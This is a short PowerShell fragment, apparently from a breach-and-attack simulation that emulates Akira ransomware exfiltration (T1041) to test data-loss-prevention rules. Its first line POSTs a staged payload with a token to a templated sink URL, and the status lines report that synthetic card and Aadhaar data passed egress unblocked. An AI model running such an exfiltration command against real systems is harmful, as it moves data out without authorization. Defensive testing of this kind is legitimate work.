        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$staged; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1041: pre-encryption staging record POSTed over HTTPS. [BAS-SIM-AKIRA-S5B]"
        Write-Output "FAIL: synthetic regulated-data record traversed egress HTTPS unblocked — DLP did not match PAN/Aadhaar/card patterns. Tune DLP rules."
